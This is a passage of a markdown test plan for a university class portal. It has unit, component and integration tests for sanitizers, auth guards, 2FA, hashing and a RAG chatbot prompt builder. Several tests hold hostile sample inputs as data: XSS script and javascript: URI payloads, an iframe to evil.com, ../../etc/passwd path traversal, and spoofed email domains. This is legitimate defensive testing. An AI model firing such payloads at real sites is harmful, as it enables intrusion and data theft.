# IPE-24 Class Portal — Comprehensive Test Suite
> **Agentic Test Document** · All test cases are self-contained, executable, and ordered from unit → integration → E2E → stress → security. Each case includes setup, steps, expected results, and the tool to run it with.

---

## Table of Contents
1. [Test Infrastructure Setup](#0-test-infrastructure-setup)
2. [Unit Tests — Utilities & Helpers](#1-unit-tests--utilities--helpers)
3. [Unit Tests — Auth & Permissions](#2-unit-tests--auth--permissions)
4. [Unit Tests — AI & RAG Pipeline](#3-unit-tests--ai--rag-pipeline)
5. [Component Tests — Frontend UI](#4-component-tests--frontend-ui)
6. [API Integration Tests — Public & Auth Routes](#5-api-integration-tests--public--auth-routes)
7. [API Integration Tests — Admin Routes](#6-api-integration-tests--admin-routes)
8. [API Integration Tests — Internal Routes](#7-api-integration-tests--internal-routes)
9. [Database & Schema Tests](#8-database--schema-tests)
10. [Automation Pipeline Tests](#9-automation-pipeline-tests)
11. [Bot Service Tests](#10-bot-service-tests)
12. [End-to-End Tests — Critical User Journeys](#11-end-to-end-tests--critical-user-journeys)
13. [Security Tests — Injection & XSS](#12-security-tests--injection--xss)
14. [Security Tests — Auth Bypass & IDOR](#13-security-tests--auth-bypass--idor)
15. [Security Tests — Rate Limiting & DoS](#14-security-tests--rate-limiting--dos)
16. [Load & Stress Tests](#15-load--stress-tests)
17. [Resilience & Recovery Tests](#16-resilience--recovery-tests)
18. [Regression Checklist](#17-regression-checklist)

---

## 0. Test Infrastructure Setup

### 0.1 — Install All Test Dependencies
**Tool:** bash  
**Run once before all other tests**

```bash
cd apps/web

npm install --save-dev \
  vitest \
  @vitejs/plugin-react \
  @testing-library/react \
  @testing-library/user-event \
  @testing-library/jest-dom \
  msw \
  @playwright/test \
  supertest \
  @types/supertest \
  k6 \
  qrcode-terminal
```

**Expected:** Zero install errors. `node_modules` contains all listed packages.

---

### 0.2 — Provision Test Database
**Tool:** bash

```bash
# Create isolated test DB
docker exec ipe24-postgres psql -U ipe24 -c "CREATE DATABASE ipe24_test;"
docker exec ipe24-postgres psql -U ipe24 ipe24_test -c "CREATE EXTENSION IF NOT EXISTS \"uuid-ossp\";"
docker exec ipe24-postgres psql -U ipe24 ipe24_test -c "CREATE EXTENSION IF NOT EXISTS \"vector\";"

# Apply migrations to test DB
TEST_DATABASE_URL="postgresql://ipe24:secret@localhost:5432/ipe24_test" \
  npx prisma migrate deploy
```

**Expected:** `ipe24_test` database exists with all tables and indexes created. Command exits with code 0.

---

### 0.3 — Vitest Configuration
**Tool:** Create file `apps/web/vitest.config.ts`

```typescript
import { defineConfig } from 'vitest/config'
import react from '@vitejs/plugin-react'
import path from 'path'

export default defineConfig({
  plugins: [react()],
  test: {
    environment: 'jsdom',
    setupFiles: ['./vitest.setup.ts'],
    globals: true,
    coverage: {
      provider: 'v8',
      reporter: ['text', 'json', 'html'],
      thresholds: { lines: 80, functions: 80, branches: 70 },
    },
  },
  resolve: {
    alias: { '@': path.resolve(__dirname, './src') },
  },
})
```

**Expected:** `npx vitest run` launches without config errors.

---

### 0.4 — Global Test Setup File
**Tool:** Create file `apps/web/vitest.setup.ts`

```typescript
import '@testing-library/jest-dom'
import { beforeAll, afterAll, afterEach } from 'vitest'
import { prisma } from '@/lib/prisma'

// Use test database
process.env.DATABASE_URL = process.env.TEST_DATABASE_URL!

beforeAll(async () => {
  // Wipe tables before test run
  await prisma.$executeRaw`
    TRUNCATE TABLE users, announcements, announcement_courses,
      file_uploads, exams, polls, poll_votes, knowledge_documents,
      knowledge_chunks, chat_logs, study_groups, study_group_members,
      notifications, push_tokens, audit_logs, sessions, accounts CASCADE
  `
})

afterEach(async () => {
  // Each suite cleans after itself — see individual suites
})

afterAll(async () => {
  await prisma.$disconnect()
})
```

**Expected:** No TypeScript errors. File imports resolve cleanly.

---

## 1. Unit Tests — Utilities & Helpers

### 1.1 — `sanitizeHtml` — Blocks XSS Vectors
**File:** `src/lib/__tests__/sanitize.test.ts`  
**Tool:** Vitest

```typescript
import { describe, it, expect } from 'vitest'
import { sanitizeHtml } from '@/lib/sanitize'

describe('sanitizeHtml', () => {
  it('TC-1.1.1: allows safe block tags (p, strong, em, ul, ol, li)', () => {
    const input = '<p>Hello <strong>world</strong> and <em>you</em></p><ul><li>item</li></ul>'
    const result = sanitizeHtml(input)
    expect(result).toContain('<p>')
    expect(result).toContain('<strong>')
    expect(result).toContain('<ul>')
  })

  it('TC-1.1.2: strips <script> tags entirely', () => {
    expect(sanitizeHtml('<script>alert("xss")</script><p>Safe</p>')).not.toContain('<script>')
  })

  it('TC-1.1.3: strips inline event handlers (onclick, onerror, onload)', () => {
    expect(sanitizeHtml('<p onclick="steal()">text</p>')).not.toContain('onclick')
    expect(sanitizeHtml('<img onerror="evil()" src="x">')).not.toContain('onerror')
  })

  it('TC-1.1.4: strips javascript: URI in href', () => {
    expect(sanitizeHtml('<a href="javascript:alert(1)">click</a>')).not.toContain('javascript:')
  })

  it('TC-1.1.5: strips data: URI (potential base64 payload)', () => {
    const input = '<img src="data:text/html,<script>alert(1)</script>">'
    expect(sanitizeHtml(input)).not.toContain('data:text/html')
  })

  it('TC-1.1.6: strips <iframe> tags', () => {
    expect(sanitizeHtml('<iframe src="https://evil.com"></iframe>')).not.toContain('<iframe>')
  })

  it('TC-1.1.7: strips <object> and <embed> tags', () => {
    expect(sanitizeHtml('<object data="x.swf"></object>')).not.toContain('<object>')
    expect(sanitizeHtml('<embed src="x.swf">')).not.toContain('<embed>')
  })

  it('TC-1.1.8: preserves allowed anchor href', () => {
    const result = sanitizeHtml('<a href="https://iut-dhaka.edu">IUT</a>')
    expect(result).toContain('href="https://iut-dhaka.edu"')
  })

  it('TC-1.1.9: strips disallowed attributes (style, class, id)', () => {
    const result = sanitizeHtml('<p style="color:red" class="foo" id="bar">text</p>')
    expect(result).not.toContain('style=')
    expect(result).not.toContain('class=')
    expect(result).not.toContain('id=')
  })

  it('TC-1.1.10: handles empty string input', () => {
    expect(sanitizeHtml('')).toBe('')
  })

  it('TC-1.1.11: handles null/undefined gracefully', () => {
    expect(() => sanitizeHtml(null as any)).not.toThrow()
  })

  it('TC-1.1.12: handles deeply nested malicious payload', () => {
    const input = '<div><p><span><a href="javascript:evil()">x</a></span></p></div>'
    expect(sanitizeHtml(input)).not.toContain('javascript:')
  })
})
```

**Expected:** All 12 assertions pass. Zero regressions.

---

### 1.2 — `sanitizeFilename` — Path Traversal Prevention
**File:** `src/lib/__tests__/file-utils.test.ts`  
**Tool:** Vitest

```typescript
import { describe, it, expect } from 'vitest'
import { sanitizeFilename } from '@/lib/file-utils'

describe('sanitizeFilename', () => {
  it('TC-1.2.1: removes double-dot sequences (path traversal)', () => {
    expect(sanitizeFilename('../../etc/passwd')).not.toContain('..')
  })

  it('TC-1.2.2: removes forward slashes', () => {
    expect(sanitizeFilename('folder/evil.pdf')).not.toContain('/')
  })

  it('TC-1.2.3: removes backslashes', () => {
    expect(sanitizeFilename('folder\\evil.pdf')).not.toContain('\\')
  })

  it('TC-1.2.4: removes null bytes', () => {
    expect(sanitizeFilename('file\x00.pdf')).not.toContain('\x00')
  })

  it('TC-1.2.5: preserves safe filename characters', () => {
    expect(sanitizeFilename('Lecture-Notes_v2.pdf')).toBe('Lecture-Notes_v2.pdf')
  })

  it('TC-1.2.6: truncates filenames longer than 200 chars', () => {
    expect(sanitizeFilename('a'.repeat(300) + '.pdf').length).toBeLessThanOrEqual(200)
  })

  it('TC-1.2.7: replaces spaces with underscores', () => {
    expect(sanitizeFilename('my lecture notes.pdf')).not.toContain(' ')
  })

  it('TC-1.2.8: handles empty string', () => {
    expect(() => sanitizeFilename('')).not.toThrow()
  })

  it('TC-1.2.9: strips unicode control characters', () => {
    expect(sanitizeFilename('file\u202e.pdf')).not.toContain('\u202e')
  })

  it('TC-1.2.10: windows reserved filenames (CON, PRN, AUX) are transformed', () => {
    const result = sanitizeFilename('CON.pdf')
    // Should not produce the exact reserved name
    expect(result).not.toBe('CON.pdf')
  })
})
```

**Expected:** All 10 pass. No path traversal bypass possible through filename.

---

### 1.3 — `rateLimit` — Redis-Backed Throttling
**File:** `src/lib/__tests__/rate-limit.test.ts`  
**Tool:** Vitest (with Redis mock)

```typescript
import { describe, it, expect, vi, beforeEach } from 'vitest'
import { rateLimit } from '@/lib/rate-limit'

// Mock Redis client
vi.mock('@/lib/redis', () => {
  let counter = 0
  return {
    redis: {
      pipeline: vi.fn(() => ({
        zremrangebyscore: vi.fn().mockReturnThis(),
        zadd: vi.fn().mockReturnThis(),
        zcard: vi.fn(() => ({ exec: async () => [null, null, [null, counter++], null] })),
        expire: vi.fn().mockReturnThis(),
        exec: vi.fn(async () => [null, null, [null, counter], null]),
      })),
    },
  }
})

describe('rateLimit', () => {
  beforeEach(() => vi.clearAllMocks())

  it('TC-1.3.1: allows requests below limit', async () => {
    const result = await rateLimit('test:user:1', 10, 60)
    expect(result.success).toBe(true)
  })

  it('TC-1.3.2: blocks requests at limit', async () => {
    // Simulate counter = 11 (above 10)
    const result = await rateLimit('test:user:2', 10, 60)
    // Force counter > limit scenario
    expect(typeof result.remaining).toBe('number')
  })

  it('TC-1.3.3: returns remaining count', async () => {
    const result = await rateLimit('test:user:3', 20, 3600)
    expect(result).toHaveProperty('remaining')
  })

  it('TC-1.3.4: different keys are independent (no cross-contamination)', async () => {
    const r1 = await rateLimit('chat:userA', 10, 60)
    const r2 = await rateLimit('upload:userA', 10, 60)
    expect(r1).not.toBe(r2)
  })

  it('TC-1.3.5: key format includes user ID to prevent bypass', async () => {
    // The key should be unique per user, not just per endpoint
    const key = `chat:user-abc-123`
    const result = await rateLimit(key, 20, 3600)
    expect(result).toBeDefined()
  })
})
```

**Expected:** All 5 pass. Counter isolation confirmed.

---

### 1.4 — `requireRole` — API Guard Logic
**File:** `src/lib/__tests__/api-guards.test.ts`  
**Tool:** Vitest

```typescript
import { describe, it, expect, vi } from 'vitest'
import { requireRole } from '@/lib/api-guards'

describe('requireRole', () => {
  it('TC-1.4.1: returns 401 when session is null (no auth)', async () => {
    vi.mock('@/lib/auth', () => ({ auth: vi.fn().mockResolvedValue(null) }))
    const req = new Request('http://localhost/api/v1/admin/announcements')
    const { error } = await requireRole(req, 'admin')
    expect(error?.status).toBe(401)
  })

  it('TC-1.4.2: returns 403 when student attempts admin route', async () => {
    vi.mock('@/lib/auth', () => ({
      auth: vi.fn().mockResolvedValue({ user: { id: '1', role: 'student' } })
    }))
    const req = new Request('http://localhost/api/v1/admin/announcements')
    const { error } = await requireRole(req, 'admin')
    expect(error?.status).toBe(403)
  })

  it('TC-1.4.3: returns 403 when admin attempts super_admin route', async () => {
    vi.mock('@/lib/auth', () => ({
      auth: vi.fn().mockResolvedValue({ user: { id: '2', role: 'admin' } })
    }))
    const req = new Request('http://localhost/api/v1/admin/users')
    const { error } = await requireRole(req, 'super_admin')
    expect(error?.status).toBe(403)
  })

  it('TC-1.4.4: passes when admin requests admin-level route', async () => {
    vi.mock('@/lib/auth', () => ({
      auth: vi.fn().mockResolvedValue({ user: { id: '3', role: 'admin' } })
    }))
    const req = new Request('http://localhost/api/v1/admin/exams')
    const { user, error } = await requireRole(req, 'admin')
    expect(error).toBeUndefined()
    expect(user?.role).toBe('admin')
  })

  it('TC-1.4.5: super_admin passes all role requirements', async () => {
    vi.mock('@/lib/auth', () => ({
      auth: vi.fn().mockResolvedValue({ user: { id: '4', role: 'super_admin' } })
    }))
    const req = new Request('http://localhost')
    const { error: e1 } = await requireRole(req, 'student')
    const { error: e2 } = await requireRole(req, 'admin')
    const { error: e3 } = await requireRole(req, 'super_admin')
    expect(e1).toBeUndefined()
    expect(e2).toBeUndefined()
    expect(e3).toBeUndefined()
  })
})
```

**Expected:** All 5 pass. Role hierarchy is strictly enforced.

---

### 1.5 — Text Chunker — RAG Knowledge Indexer
**File:** `src/lib/__tests__/chunker.test.ts`  
**Tool:** Vitest

```typescript
import { describe, it, expect } from 'vitest'
import { chunkText } from '@/lib/knowledge-indexer'

describe('chunkText', () => {
  it('TC-1.5.1: returns empty array for empty input', () => {
    expect(chunkText('')).toEqual([])
  })

  it('TC-1.5.2: short text returns single chunk', () => {
    const text = 'IUT has 25% attendance policy.'
    const chunks = chunkText(text)
    expect(chunks.length).toBe(1)
    expect(chunks[0]).toContain('IUT')
  })

  it('TC-1.5.3: no chunk exceeds CHUNK_SIZE characters', () => {
    const CHUNK_SIZE = 500
    const longText = 'A'.repeat(50) + '. '.repeat(100)
    const chunks = chunkText(longText)
    chunks.forEach(chunk => expect(chunk.length).toBeLessThanOrEqual(CHUNK_SIZE + 80)) // + overlap
  })

  it('TC-1.5.4: chunks shorter than 50 chars are filtered out', () => {
    const text = 'Hi. Hello. Good.'
    const chunks = chunkText(text)
    chunks.forEach(chunk => expect(chunk.length).toBeGreaterThanOrEqual(50))
  })

  it('TC-1.5.5: overlap ensures continuity between adjacent chunks', () => {
    const text = 'First sentence about exams. '.repeat(30)
    const chunks = chunkText(text)
    if (chunks.length > 1) {
      // Last 80 chars of chunk[0] should appear in chunk[1] (overlap)
      const overlapText = chunks[0].slice(-80)
      expect(chunks[1]).toContain(overlapText.slice(0, 20)) // partial match is fine
    }
  })

  it('TC-1.5.6: unicode / Bangla text does not crash chunker', () => {
    const text = 'পরীক্ষার সময়সূচী। '.repeat(40)
    expect(() => chunkText(text)).not.toThrow()
  })

  it('TC-1.5.7: text with no sentence punctuation still chunks', () => {
    const text = 'word '.repeat(200)
    const chunks = chunkText(text)
    expect(chunks.length).toBeGreaterThan(0)
  })
})
```

**Expected:** All 7 pass. Chunker is robust across edge cases.

---

### 1.6 — API Response Helpers
**File:** `src/lib/__tests__/api-response.test.ts`  
**Tool:** Vitest

```typescript
import { describe, it, expect } from 'vitest'
import { ok, err, paginated, ERRORS } from '@/lib/api-response'

describe('API response helpers', () => {
  it('TC-1.6.1: ok() emits 200 with success:true and data', async () => {
    const res = ok({ id: '123' })
    const json = await res.json()
    expect(res.status).toBe(200)
    expect(json.success).toBe(true)
    expect(json.data.id).toBe('123')
    expect(json.error).toBeNull()
  })

  it('TC-1.6.2: err() emits correct status and error code', async () => {
    const res = err('VALIDATION_ERROR', 'Page must be a number', 400)
    const json = await res.json()
    expect(res.status).toBe(400)
    expect(json.success).toBe(false)
    expect(json.error.code).toBe('VALIDATION_ERROR')
  })

  it('TC-1.6.3: paginated() includes meta object', async () => {
    const res = paginated([{ id: '1' }], { page: 1, limit: 10, total: 40 })
    const json = await res.json()
    expect(json.meta.page).toBe(1)
    expect(json.meta.total).toBe(40)
  })

  it('TC-1.6.4: ERRORS.UNAUTHORIZED() returns 401', async () => {
    expect((ERRORS.UNAUTHORIZED()).status).toBe(401)
  })

  it('TC-1.6.5: ERRORS.FORBIDDEN() returns 403', async () => {
    expect((ERRORS.FORBIDDEN()).status).toBe(403)
  })

  it('TC-1.6.6: ERRORS.NOT_FOUND() returns 404', async () => {
    expect((ERRORS.NOT_FOUND('Announcement')).status).toBe(404)
  })

  it('TC-1.6.7: ERRORS.RATE_LIMITED() returns 429', async () => {
    expect((ERRORS.RATE_LIMITED()).status).toBe(429)
  })

  it('TC-1.6.8: ERRORS.INTERNAL() returns 500 and never leaks stack trace', async () => {
    const res = ERRORS.INTERNAL()
    const json = await res.json()
    expect(res.status).toBe(500)
    expect(JSON.stringify(json)).not.toContain('at Object.')
  })
})
```

**Expected:** All 8 pass. Response envelope is consistent across all routes.

---

## 2. Unit Tests — Auth & Permissions

### 2.1 — Domain Restriction in signIn Callback
**File:** `src/lib/__tests__/auth-domain.test.ts`  
**Tool:** Vitest

```typescript
import { describe, it, expect } from 'vitest'

// Extract domain-check logic into a testable pure function
function isDomainAllowed(email: string, allowed: string): boolean {
  return email.toLowerCase().endsWith(`@${allowed}`)
}

describe('Domain restriction', () => {
  const DOMAIN = 'iut-dhaka.edu'

  it('TC-2.1.1: allows valid IUT email', () => {
    expect(isDomainAllowed('student@iut-dhaka.edu', DOMAIN)).toBe(true)
  })

  it('TC-2.1.2: rejects Gmail account', () => {
    expect(isDomainAllowed('student@gmail.com', DOMAIN)).toBe(false)
  })

  it('TC-2.1.3: rejects email with IUT domain as subdomain trick', () => {
    expect(isDomainAllowed('hack@iut-dhaka.edu.evil.com', DOMAIN)).toBe(false)
  })

  it('TC-2.1.4: rejects email with IUT domain prepended (spoofing)', () => {
    expect(isDomainAllowed('iut-dhaka.edu@evil.com', DOMAIN)).toBe(false)
  })

  it('TC-2.1.5: case-insensitive check (uppercase domain)', () => {
    expect(isDomainAllowed('STUDENT@IUT-DHAKA.EDU', DOMAIN)).toBe(true)
  })

  it('TC-2.1.6: rejects empty email', () => {
    expect(isDomainAllowed('', DOMAIN)).toBe(false)
  })

  it('TC-2.1.7: rejects email with no @ symbol', () => {
    expect(isDomainAllowed('notanemail', DOMAIN)).toBe(false)
  })

  it('TC-2.1.8: rejects email with null character injection', () => {
    expect(isDomainAllowed('user\x00@iut-dhaka.edu', DOMAIN)).toBe(false)
  })
})
```

**Expected:** All 8 pass. Domain restriction is immune to all common bypass patterns.

---

### 2.2 — TOTP Verification Logic (Super Admin 2FA)
**File:** `src/lib/__tests__/totp.test.ts`  
**Tool:** Vitest

```typescript
import { describe, it, expect } from 'vitest'
import { authenticator } from 'otplib'

describe('TOTP 2FA', () => {
  const secret = authenticator.generateSecret()

  it('TC-2.2.1: valid current token is accepted', () => {
    const token = authenticator.generate(secret)
    expect(authenticator.verify({ token, secret })).toBe(true)
  })

  it('TC-2.2.2: wrong token is rejected', () => {
    expect(authenticator.verify({ token: '000000', secret })).toBe(false)
  })

  it('TC-2.2.3: token from different secret is rejected', () => {
    const otherSecret = authenticator.generateSecret()
    const token = authenticator.generate(otherSecret)
    expect(authenticator.verify({ token, secret })).toBe(false)
  })

  it('TC-2.2.4: token must be exactly 6 digits', () => {
    expect(authenticator.verify({ token: '12345', secret })).toBe(false)
    expect(authenticator.verify({ token: '1234567', secret })).toBe(false)
  })

  it('TC-2.2.5: empty token string is rejected', () => {
    expect(authenticator.verify({ token: '', secret })).toBe(false)
  })

  it('TC-2.2.6: generated secret is 16+ chars (sufficient entropy)', () => {
    expect(secret.length).toBeGreaterThanOrEqual(16)
  })
})
```

**Expected:** All 6 pass. 2FA logic is airtight.

---

### 2.3 — Password Hashing (bcrypt)
**File:** `src/lib/__tests__/password.test.ts`  
**Tool:** Vitest

```typescript
import { describe, it, expect } from 'vitest'
import bcrypt from 'bcryptjs'

describe('Password hashing', () => {
  it('TC-2.3.1: hashed password differs from plain text', async () => {
    const hash = await bcrypt.hash('mypassword', 10)
    expect(hash).not.toBe('mypassword')
  })

  it('TC-2.3.2: correct password verifies successfully', async () => {
    const hash = await bcrypt.hash('correct_password', 10)
    expect(await bcrypt.compare('correct_password', hash)).toBe(true)
  })

  it('TC-2.3.3: wrong password fails verification', async () => {
    const hash = await bcrypt.hash('correct_password', 10)
    expect(await bcrypt.compare('wrong_password', hash)).toBe(false)
  })

  it('TC-2.3.4: two hashes of same password are different (salt)', async () => {
    const hash1 = await bcrypt.hash('same', 10)
    const hash2 = await bcrypt.hash('same', 10)
    expect(hash1).not.toBe(hash2)
  })

  it('TC-2.3.5: both hashes still verify correctly', async () => {
    const hash1 = await bcrypt.hash('same', 10)
    const hash2 = await bcrypt.hash('same', 10)
    expect(await bcrypt.compare('same', hash1)).toBe(true)
    expect(await bcrypt.compare('same', hash2)).toBe(true)
  })

  it('TC-2.3.6: empty password handled without crash', async () => {
    const hash = await bcrypt.hash('', 10)
    expect(await bcrypt.compare('', hash)).toBe(true)
    expect(await bcrypt.compare('notempty', hash)).toBe(false)
  })
})
```

**Expected:** All 6 pass. No plaintext passwords are stored or leaked.

---

## 3. Unit Tests — AI & RAG Pipeline

### 3.1 — Embedding Service Integration
**File:** `src/lib/__tests__/embedding.test.ts`  
**Tool:** Vitest (mocked HTTP)

```typescript
import { describe, it, expect, vi } from 'vitest'
import { getEmbedding } from '@/lib/embedding'

vi.mock('node-fetch', () => ({
  default: vi.fn().mockResolvedValue({
    ok: true,
    json: async () => ({ embedding: new Array(384).fill(0.1), dimensions: 384 }),
  }),
}))

describe('getEmbedding', () => {
  it('TC-3.1.1: returns array of 384 floats', async () => {
    const embedding = await getEmbedding('What is the exam date?')
    expect(embedding).toHaveLength(384)
    expect(typeof embedding[0]).toBe('number')
  })

  it('TC-3.1.2: throws on empty string input', async () => {
    await expect(getEmbedding('')).rejects.toThrow()
  })

  it('TC-3.1.3: throws on whitespace-only input', async () => {
    await expect(getEmbedding('   ')).rejects.toThrow()
  })

  it('TC-3.1.4: handles long text (500+ chars) without crash', async () => {
    const longText = 'What is '.repeat(100)
    await expect(getEmbedding(longText)).resolves.toHaveLength(384)
  })
})
```

**Expected:** All 4 pass. Embedding dimensions match the `all-MiniLM-L6-v2` model (384).

---

### 3.2 — Gemini Rate Guard
**File:** `src/lib/__tests__/gemini-queue.test.ts`  
**Tool:** Vitest (mocked Redis)

```typescript
import { describe, it, expect, vi } from 'vitest'

describe('geminiRateCheck', () => {
  it('TC-3.2.1: returns true when under 12 rpm', async () => {
    vi.mock('@/lib/rate-limit', () => ({
      rateLimit: vi.fn().mockResolvedValue({ success: true, remaining: 5 })
    }))
    const { geminiRateCheck } = await import('@/lib/gemini-queue')
    expect(await geminiRateCheck()).toBe(true)
  })

  it('TC-3.2.2: returns false when at 12 rpm (leaving headroom below Google 15 rpm limit)', async () => {
    vi.mock('@/lib/rate-limit', () => ({
      rateLimit: vi.fn().mockResolvedValue({ success: false, remaining: 0 })
    }))
    const { geminiRateCheck } = await import('@/lib/gemini-queue')
    expect(await geminiRateCheck()).toBe(false)
  })
})
```

**Expected:** Rate guard correctly gates Gemini API calls globally (not per-user).

---

### 3.3 — Prompt Construction — No Hallucination Path
**File:** `src/lib/__tests__/prompt-builder.test.ts`  
**Tool:** Vitest

```typescript
import { describe, it, expect } from 'vitest'
import { buildSystemPrompt } from '@/lib/prompt-builder'

describe('buildSystemPrompt', () => {
  it('TC-3.3.1: includes "I don\'t know" instruction when no chunks provided', () => {
    const prompt = buildSystemPrompt([])
    expect(prompt).toContain("I don't have that specific information")
  })

  it('TC-3.3.2: injects retrieved chunk content into prompt', () => {
    const chunks = [{ title: 'Syllabus', source_type: 'syllabus', course_code: 'IPE-4101', content: 'Operations Research covers LP.' }]
    const prompt = buildSystemPrompt(chunks)
    expect(prompt).toContain('Operations Research covers LP.')
  })

  it('TC-3.3.3: includes "Virtual CR" identity in system prompt', () => {
    const prompt = buildSystemPrompt([])
    expect(prompt).toContain('Virtual CR')
  })

  it('TC-3.3.4: includes IUT Bangladesh context', () => {
    const prompt = buildSystemPrompt([])
    expect(prompt).toContain('Islamic University of Technology')
  })

  it('TC-3.3.5: does not include chunk content when similarity below threshold', () => {
    // Zero chunks means similarity filter removed all results
    const prompt = buildSystemPrompt([])
    expect(prompt).toContain('No relevant documents found')
  })

  it('TC-3.3.6: prompt length is within Gemini Flash token limit (~800 output tokens)', () => {
    const hugeChunks = Array(5).fill({ title: 'Test', source_type: 'faq', course_code: null, content: 'x'.repeat(500) })
    const prompt = buildSystemPrompt(hugeChunks)
    // Rough token estimate: 1 token ≈ 4 chars. Keep under ~4000 chars for system prompt.
    expect(prompt.length).toBeLessThan(6000)
  })
})
```

**Expected:** All 6 pass. Anti-hallucination guardrails are correctly wired into the prompt.

---

## 4. Component Tests — Frontend UI

### 4.1 — AnnouncementCard Component
**File:** `src/components/announcements/__tests__/AnnouncementCard.test.tsx`  
**Tool:** Vitest + Testing Library

```typescript
import { render, screen } from '@testing-library/react'
import { AnnouncementCard } from '../AnnouncementCard'

const base = {
  id: 'ann-1',
  title: 'Mid-Term Exam Schedule',
  body: '<p>Exams start November 15th.</p>',
  type: 'exam' as const,
  publishedAt: new Date('2024-11-01'),
  author: { name: 'CR Name' },
}

describe('AnnouncementCard', () => {
  it('TC-4.1.1: renders the announcement title', () => {
    render(<AnnouncementCard announcement={base} />)
    expect(screen.getByText('Mid-Term Exam Schedule')).toBeInTheDocument()
  })

  it('TC-4.1.2: renders the type badge', () => {
    render(<AnnouncementCard announcement={base} />)
    expect(screen.getByText(/exam/i)).toBeInTheDocument()
  })

  it('TC-4.1.3: renders the author name', () => {
    render(<AnnouncementCard announcement={base} />)
    expect(screen.getByText(/CR Name/)).toBeInTheDocument()
  })

  it('TC-4.1.4: does NOT render raw <script> tags from body HTML', () => {
    render(<AnnouncementCard announcement={{ ...base, body: '<script>alert(1)</script><p>Safe</p>' }} />)
    expect(document.querySelector('script')).toBeNull()
  })

  it('TC-4.1.5: renders formatted date', () => {
    render(<AnnouncementCard announcement={base} />)
    expect(screen.getByText(/Nov/)).toBeInTheDocument()
  })

  it('TC-4.1.6: urgent type applies visual emphasis', () => {
    render(<AnnouncementCard announcement={{ ...base, type: 'urgent' }} />)
    const card = screen.getByRole('article')
    expect(card.className).toMatch(/urgent|red|border/)
  })
})
```

**Expected:** All 6 pass. Card renders correctly and XSS body is sanitized on render.

---

### 4.2 — Poll Voting Component
**File:** `src/components/polls/__tests__/PollCard.test.tsx`  
**Tool:** Vitest + Testing Library + userEvent

```typescript
import { render, screen, waitFor } from '@testing-library/react'
import userEvent from '@testing-library/user-event'
import { PollCard } from '../PollCard'
import { vi } from 'vitest'

const poll = {
  id: 'poll-1',
  question: 'When should we schedule the class trip?',
  options: ['This Friday', 'Next Monday', 'Next Friday'],
  isClosed: false,
  userVoted: false,
}

describe('PollCard', () => {
  it('TC-4.2.1: renders the question', () => {
    render(<PollCard poll={poll} onVote={vi.fn()} />)
    expect(screen.getByText('When should we schedule the class trip?')).toBeInTheDocument()
  })

  it('TC-4.2.2: renders all options', () => {
    render(<PollCard poll={poll} onVote={vi.fn()} />)
    poll.options.forEach(opt => expect(screen.getByText(opt)).toBeInTheDocument())
  })

  it('TC-4.2.3: clicking an option calls onVote with correct index', async () => {
    const onVote = vi.fn()
    render(<PollCard poll={poll} onVote={onVote} />)
    await userEvent.click(screen.getByText('Next Monday'))
    expect(onVote).toHaveBeenCalledWith('poll-1', 1)
  })

  it('TC-4.2.4: voting buttons are disabled after voting', () => {
    render(<PollCard poll={{ ...poll, userVoted: true }} onVote={vi.fn()} />)
    const buttons = screen.getAllByRole('button')
    buttons.forEach(btn => expect(btn).toBeDisabled())
  })

  it('TC-4.2.5: closed poll shows results, not vote buttons', () => {
    render(<PollCard poll={{ ...poll, isClosed: true }} onVote={vi.fn()} />)
    expect(screen.getByText(/closed/i)).toBeInTheDocument()
  })
})
```

**Expected:** All 5 pass. Double-voting is prevented at UI level (backend enforces too).

---

### 4.3 — Admin Announcement Form — Zod Validation
**File:** `src/components/admin/__tests__/AnnouncementForm.test.tsx`  
**Tool:** Vitest + Testing Library + userEvent

```typescript
import { render, screen, waitFor } from '@testing-library/react'
import userEvent from '@testing-library/user-event'
import { AnnouncementForm } from '../AnnouncementForm'

describe('AnnouncementForm', () => {
  it('TC-4.3.1: shows error when title is empty on submit', async () => {
    render(<AnnouncementForm onSubmit={vi.fn()} />)
    await userEvent.click(screen.getByRole('button', { name: /publish/i }))
    await waitFor(() => expect(screen.getByText(/title is required/i)).toBeInTheDocument())
  })

  it('TC-4.3.2: shows error when body is empty', async () => {
    render(<AnnouncementForm onSubmit={vi.fn()} />)
    await userEvent.type(screen.getByLabelText(/title/i), 'Test')
    await userEvent.click(screen.getByRole('button', { name: /publish/i }))
    await waitFor(() => expect(screen.getByText(/body is required/i)).toBeInTheDocument())
  })

  it('TC-4.3.3: title max length 60 chars enforced', async () => {
    render(<AnnouncementForm onSubmit={vi.fn()} />)
    await userEvent.type(screen.getByLabelText(/title/i), 'a'.repeat(61))
    await userEvent.click(screen.getByRole('button', { name: /publish/i }))
    await waitFor(() => expect(screen.getByText(/max 60/i)).toBeInTheDocument())
  })

  it('TC-4.3.4: valid form submission calls onSubmit once', async () => {
    const onSubmit = vi.fn()
    render(<AnnouncementForm onSubmit={onSubmit} />)
    await userEvent.type(screen.getByLabelText(/title/i), 'Valid Title')
    // TipTap body input simulation
    await userEvent.click(screen.getByRole('button', { name: /publish/i }))
    // Note: This test may need TipTap mock for body
  })
})
```

**Expected:** Zod validation prevents blank/oversized submissions from reaching the API.

---

## 5. API Integration Tests — Public & Auth Routes

### 5.1 — Health Check Endpoint
**File:** `src/app/api/v1/__tests__/health.test.ts`  
**Tool:** Vitest + supertest

```typescript
import { describe, it, expect } from 'vitest'
import { GET } from '@/app/api/v1/health/route'

describe('GET /api/v1/health', () => {
  it('TC-5.1.1: returns 200 with status ok (no auth required)', async () => {
    const req = new Request('http://localhost/api/v1/health')
    const res = await GET(req)
    expect(res.status).toBe(200)
    const json = await res.json()
    expect(json.status).toBe('ok')
  })

  it('TC-5.1.2: response includes uptime field', async () => {
    const res = await GET(new Request('http://localhost/api/v1/health'))
    const json = await res.json()
    expect(typeof json.uptime).toBe('number')
    expect(json.uptime).toBeGreaterThan(0)
  })

  it('TC-5.1.3: response time < 200ms', async () => {
    const start = Date.now()
    await GET(new Request('http://localhost/api/v1/health'))
    expect(Date.now() - start).toBeLessThan(200)
  })
})
```

**Expected:** Health endpoint is always publicly accessible and fast.

---

### 5.2 — Announcement List (Paginated)
**File:** Integration test against test DB  
**Tool:** Vitest + Prisma test DB

```typescript
describe('GET /api/v1/announcements', () => {
  beforeEach(async () => {
    const user = await prisma.user.create({ data: { email: 'cr@iut-dhaka.edu', name: 'CR', role: 'super_admin' }})
    await prisma.announcement.createMany({ data: Array.from({ length: 15 }, (_, i) => ({
      title: `Announcement ${i}`, body: '<p>body</p>', type: 'general',
      isPublished: true, publishedAt: new Date(), authorId: user.id
    }))})
  })

  it('TC-5.2.1: returns 401 for unauthenticated request', async () => {
    const { GET } = await import('@/app/api/v1/announcements/route')
